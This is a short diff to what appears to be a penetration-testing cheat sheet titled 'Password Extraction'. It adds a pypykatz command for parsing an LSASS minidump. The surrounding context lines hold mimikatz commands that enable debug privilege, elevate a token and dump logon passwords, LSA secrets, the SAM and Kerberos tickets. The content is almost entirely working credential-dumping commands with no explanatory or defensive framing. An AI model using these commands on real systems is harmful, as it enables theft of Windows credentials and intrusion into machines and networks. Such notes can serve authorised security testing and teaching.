@@ -1,10 +1,10 @@
 # Password Extraction
 
-### mimikatz
+### mimikatz/pypykatz
 
 Need to match architecture
 
-```
+```bash
 privilege::debug
 20 ‘OK’
 
@@ -15,6 +15,8 @@ lsadump::secrets
 kerberos::list
 
 mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+
+pypykatz lsa minidump filename.DMP
 ```
 
 ### Metasploit
